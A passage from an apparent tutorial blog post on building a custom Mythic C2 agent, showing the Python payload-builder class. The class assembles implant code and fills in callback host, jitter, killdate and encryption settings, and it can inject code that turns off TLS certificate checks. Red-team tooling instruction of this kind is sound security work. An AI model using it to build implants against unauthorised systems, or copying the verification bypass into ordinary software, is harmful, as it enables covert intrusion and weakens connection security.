+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_read_file</span>(self, path: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(path, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_apply_https_setting</span>(self, base_code: str, profile_name: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>get_parameter(<span style="color:#e6db74">&#34;https_check&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;No&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;#CERTSKIP&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;urlopen(req)&#34;</span>, <span style="color:#e6db74">&#34;urlopen(req, context=gcontext)&#34;</span>)<span style="color:#f92672">.</span>replace(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;#CERTSKIP&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        gcontext = ssl.create_default_context()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        gcontext.check_hostname = False
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        gcontext.verify_mode = ssl.CERT_NONE</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_parse_transport_template</span>(self, template_code: str) <span style="color:#f92672">-&gt;</span> dict:
+</span></span><span style="display:flex;"><span>        parts <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>split(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;###\s*(IMPORTS|CLASS_FIELDS|FUNCTIONS|CONFIG)\s*###&#34;</span>, template_code)
+</span></span><span style="display:flex;"><span>        sections <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;IMPORTS&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;CLASS_FIELDS&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;CONFIG&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, len(parts), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>            section_name <span style="color:#f92672">=</span> parts[i]<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            section_value <span style="color:#f92672">=</span> parts[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            sections[section_name] <span style="color:#f92672">=</span> section_value<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> sections
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_validate_transport_template_format</span>(self, profile_name: str, template_code: str):
+</span></span><span style="display:flex;"><span>        required <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;IMPORTS&#34;</span>, <span style="color:#e6db74">&#34;CLASS_FIELDS&#34;</span>, <span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>, <span style="color:#e6db74">&#34;CONFIG&#34;</span>]
+</span></span><span style="display:flex;"><span>        markers <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;###\s*(IMPORTS|CLASS_FIELDS|FUNCTIONS|CONFIG)\s*###&#34;</span>, template_code)
+</span></span><span style="display:flex;"><span>        missing <span style="color:#f92672">=</span> [m <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> required <span style="color:#66d9ef">if</span> markers<span style="color:#f92672">.</span>count(m) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>        duplicates <span style="color:#f92672">=</span> [m <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> required <span style="color:#66d9ef">if</span> markers<span style="color:#f92672">.</span>count(m) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> missing <span style="color:#f92672">or</span> duplicates:
+</span></span><span style="display:flex;"><span>            details <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> missing:
+</span></span><span style="display:flex;"><span>                details<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;missing markers: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(missing)))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> duplicates:
+</span></span><span style="display:flex;"><span>                details<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;duplicate markers: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(duplicates)))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Transport template transport_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> has invalid section markers (</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>                    profile_name,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;; &#34;</span><span style="color:#f92672">.</span>join(details)
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_validate_transport_sections</span>(self, profile_name: str, sections: dict):
+</span></span><span style="display:flex;"><span>        required_non_empty <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>, <span style="color:#e6db74">&#34;CONFIG&#34;</span>]
+</span></span><span style="display:flex;"><span>        missing <span style="color:#f92672">=</span> [s <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> required_non_empty <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> sections<span style="color:#f92672">.</span>get(s, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>strip()]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> missing:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Transport template transport_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> is missing required non-empty sections: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>                    profile_name,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(missing)
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_validate_core_markers_replaced</span>(self, base_code: str, profile_name: str):
+</span></span><span style="display:flex;"><span>        unresolved <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            marker <span style="color:#66d9ef">for</span> marker <span style="color:#f92672">in</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_IMPORTS&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_CLASS_FIELDS&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_FUNCTIONS&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;TRANSPORT_CONFIG&#34;</span>,
+</span></span><span style="display:flex;"><span>            ]
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> marker <span style="color:#f92672">in</span> base_code
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> unresolved:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Core template marker replacement failed for transport_</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">; unresolved markers: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(
+</span></span><span style="display:flex;"><span>                    profile_name,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(unresolved)
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_base_code_for_profile</span>(self, profile_name: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>        base_path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>getPythonVersionFile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(self<span style="color:#f92672">.</span>agent_code_path, <span style="color:#e6db74">&#34;base_agent&#34;</span>), <span style="color:#e6db74">&#34;base_agent_core&#34;</span>)
+</span></span><span style="display:flex;"><span>        transport_path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>getPythonVersionFile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(self<span style="color:#f92672">.</span>agent_code_path, <span style="color:#e6db74">&#34;base_agent&#34;</span>), <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;transport_</span><span style="color:#e6db74">{</span>profile_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> base_path:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Missing base_agent_core template for selected python version&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> transport_path:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Missing transport template for profile </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> and selected python version&#34;</span><span style="color:#f92672">.</span>format(profile_name))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_read_file(base_path)
+</span></span><span style="display:flex;"><span>        transport_template <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_read_file(transport_path)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_validate_transport_template_format(profile_name, transport_template)
+</span></span><span style="display:flex;"><span>        transport_sections <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_parse_transport_template(transport_template)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_validate_transport_sections(profile_name, transport_sections)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_IMPORTS&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;IMPORTS&#34;</span>])
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_CLASS_FIELDS&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;CLASS_FIELDS&#34;</span>])
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_FUNCTIONS&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;FUNCTIONS&#34;</span>])
+</span></span><span style="display:flex;"><span>        base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;TRANSPORT_CONFIG&#34;</span>, transport_sections[<span style="color:#e6db74">&#34;CONFIG&#34;</span>])
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_validate_core_markers_replaced(base_code, profile_name)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base_code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_to_python_literal</span>(self, value):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(value, str):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> value
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(value)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;false&#34;</span>, <span style="color:#e6db74">&#34;False&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;true&#34;</span>, <span style="color:#e6db74">&#34;True&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;null&#34;</span>, <span style="color:#e6db74">&#34;None&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_apply_c2_parameter_replacements</span>(self, base_code: str, c2):
+</span></span><span style="display:flex;"><span>        params <span style="color:#f92672">=</span> c2<span style="color:#f92672">.</span>get_parameters_dict()
+</span></span><span style="display:flex;"><span>        replacements <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_host&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_host&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_port&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_port&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;post_uri&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;post_uri&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;get_uri&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;get_uri&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;query_path_name&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;query_path_name&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_host&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_host&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_user&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_user&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_pass&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_pass&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_port&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_port&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_interval&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_interval&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_jitter&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_jitter&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;killdate&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;killdate&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;AESPSK&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;AESPSK&#34;</span>, {}),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;encrypted_exchange_check&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;encrypted_exchange_check&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;HEADER_PLACEHOLDER&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;headers&#34;</span>, {}),
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> placeholder, value <span style="color:#f92672">in</span> replacements<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> placeholder <span style="color:#f92672">in</span> base_code:
+</span></span><span style="display:flex;"><span>                base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(placeholder, self<span style="color:#f92672">.</span>_to_python_literal(value))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base_code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build</span>(self) <span style="color:#f92672">-&gt;</span> BuildResponse:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># this function gets called to create an instance of your payload</span>
+</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> BuildResponse(status<span style="color:#f92672">=</span>BuildStatus<span style="color:#f92672">.</span>Success)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># create the payload</span>
+</span></span><span style="display:flex;"><span>        build_msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            command_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> cmd <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>commands<span style="color:#f92672">.</span>get_commands():
+</span></span><span style="display:flex;"><span>                command_path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>getPythonVersionFile(self<span style="color:#f92672">.</span>agent_code_path, cmd)
+</span></span><span style="display:flex;"><span>                command_code <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>_read_file(command_path) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            selected_c2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> c2 <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>c2info:
+</span></span><span style="display:flex;"><span>                profile_name <span style="color:#f92672">=</span> c2<span style="color:#f92672">.</span>get_c2profile()[<span style="color:#e6db74">&#34;name&#34;</span>]
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> profile_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;http&#34;</span>:
+</span></span><span style="display:flex;"><span>                    selected_c2 <span style="color:#f92672">=</span> c2
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> selected_c2 <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                build_msg <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;No supported C2 profile selected for </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>name)
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>set_status(BuildStatus<span style="color:#f92672">.</span>Error)
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_stderr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Error building payload: &#34;</span> <span style="color:#f92672">+</span> build_msg
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            profile_name <span style="color:#f92672">=</span> selected_c2<span style="color:#f92672">.</span>get_c2profile()[<span style="color:#e6db74">&#34;name&#34;</span>]
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_code_for_profile(profile_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_apply_https_setting(base_code, profile_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            crypto_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_read_file(self<span style="color:#f92672">.</span>getPythonVersionFile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(self<span style="color:#f92672">.</span>agent_code_path, <span style="color:#e6db74">&#34;base_agent&#34;</span>), <span style="color:#e6db74">&#34;crypto_lib&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;CRYPTO_HERE&#34;</span>, crypto_code)
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;UUID_HERE&#34;</span>, self<span style="color:#f92672">.</span>uuid)
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;#COMMANDS_HERE&#34;</span>, command_code)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_apply_c2_parameter_replacements(base_code, selected_c2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> build_msg <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_stderr <span style="color:#f92672">=</span> build_msg
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>set_status(BuildStatus<span style="color:#f92672">.</span>Error)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+</span></span><span style="display:flex;"><span>                PayloadUUID<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>uuid,
+</span></span><span style="display:flex;"><span>                StepName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gathering Files&#34;</span>,
+</span></span><span style="display:flex;"><span>                StepStdout<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Found all files for payload&#34;</span>,
+</span></span><span style="display:flex;"><span>                StepSuccess<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            ))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>get_parameter(<span style="color:#e6db74">&#34;output&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;base64&#34;</span>:
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(base_code<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Successfully Built&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>payload <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Successfully built!&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            resp<span style="color:#f92672">.</span>set_status(BuildStatus<span style="color:#f92672">.</span>Error)
+</span></span><span style="display:flex;"><span>            resp<span style="color:#f92672">.</span>build_stderr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Error building payload: &#34;</span> <span style="color:#f92672">+</span> str(e)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resp
+</span></span></code></pre></div><p><em>note : your defined class needs to extend the <code>PayloadType</code> class</em></p>
+<p>Let&rsquo;s break this down part by part :</p>
+<h4 id="class-definition--metadata">Class Definition &amp; Metadata</h4>
+<p>The first thing you&rsquo;ll notice is the class itself :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">WeeAgent</span>(PayloadType):
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;WeeAgent&#34;</span>
+</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;py&#34;</span>
+</span></span><span style="display:flex;"><span>    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@Yassine-elhammoumi&#34;</span>
+</span></span><span style="display:flex;"><span>    supported_os <span style="color:#f92672">=</span> [SupportedOS<span style="color:#f92672">.</span>Linux, SupportedOS<span style="color:#f92672">.</span>Windows]
+</span></span><span style="display:flex;"><span>    wrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    mythic_encrypts <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    c2_profiles <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;http&#34;</span>]
+</span></span></code></pre></div><p>This is basically the identity card of your agent. Mythic reads all of these fields to register it in the UI. A couple things worth noting here :</p>
+<ul>
+<li><code>mythic_encrypts = True</code> means we&rsquo;re offloading AES encryption to Mythic itself, so we don&rsquo;t have to implement it in the implant</li>
+<li><code>c2_profiles = [&quot;http&quot;]</code> ties the agent to the http profile, meaning it won&rsquo;t be buildable without it selected</li>
+</ul>
+<h4 id="build-parameters">Build Parameters</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>build_parameters <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    BuildParameter(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;output&#34;</span>, <span style="color:#f92672">...</span>),
+</span></span><span style="display:flex;"><span>    BuildParameter(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;python_version&#34;</span>, <span style="color:#f92672">...</span>),
